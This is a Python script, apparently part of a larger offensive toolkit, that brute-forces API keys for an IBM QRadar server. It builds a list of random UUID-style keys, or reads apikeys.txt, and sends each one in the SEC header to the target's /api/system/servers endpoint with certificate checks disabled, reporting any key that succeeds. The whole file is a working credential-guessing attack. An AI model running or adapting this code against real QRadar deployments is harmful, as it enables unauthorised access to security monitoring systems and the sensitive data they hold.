#!/usr/bin/env python3

# QRadar API Key Bruteforce

# %%%%%%%%%%% Libraries %%%%%%%%%%%#

import os
import random
import globals
import requests

from colorama import Fore, Style

# %%%%%%%%%%% Constants %%%%%%%%%%%#

keys = 'apikeys.txt'

# %%%%%%%%%% Functions %%%%%%%%%#


def qradar_apikeybrute(ip, port):
	__location__ = os.path.realpath(
		os.path.join(os.getcwd(), os.path.dirname(__file__)))

	if os.path.isfile(os.path.join(__location__, keys)):
		file = open(os.path.join(__location__, keys))
	else:
		cant = input(
			Fore.CYAN + Style.BRIGHT +
			"[!] Enter the number of apikeys you want in the dictionary: " +
			Style.RESET_ALL)
		try:
			api_dict(cant)
			file = open(os.path.join(__location__, keys))
		except:
			globals.qradar_messages(1)

	bfs = 0

	for line in file:

		api = line.strip('\n\r')
		url = globals.https + ip + ":" + str(port) + "/api/system/servers"
		headers = {'SEC': api}

		if requests.get(url, headers=headers, verify=False).status_code == 200:
			globals.messages(7)
			globals.qradar_messages(2, api)
			bfs = 1
			file.close()
			break

	if bfs == 0:
		globals.messages(8)
		file.close()


def api_dict(cant):
	longs = [8, 4, 4, 4, 12]
	cont = [
		'0', '1', '2', '3', '4', '5', '6', '7',
		'8', '9', 'a', 'b', 'c', 'd', 'e', 'f']
	i = 0
	apikey = ''
	n = 1
	c = 0
	__location__ = os.path.realpath(
		os.path.join(os.getcwd(), os.path.dirname(__file__)))
	while c < int(cant):
		while i <= 4:
			while n <= longs[i]:
				random.shuffle(cont)
				apikey = apikey + cont[i]
				n += 1
			apikey = apikey + '-'
			i += 1
			n = 1
		dict_api = open(os.path.join(__location__, keys), 'a')
		dict_api.write(apikey[:len(apikey) - 1])
		dict_api.write('\n')
		dict_api.close()
		i = 0
		n = 1
		apikey = ''
		c += 1


# %%%%%%%%%% The End %%%%%%%%%%#
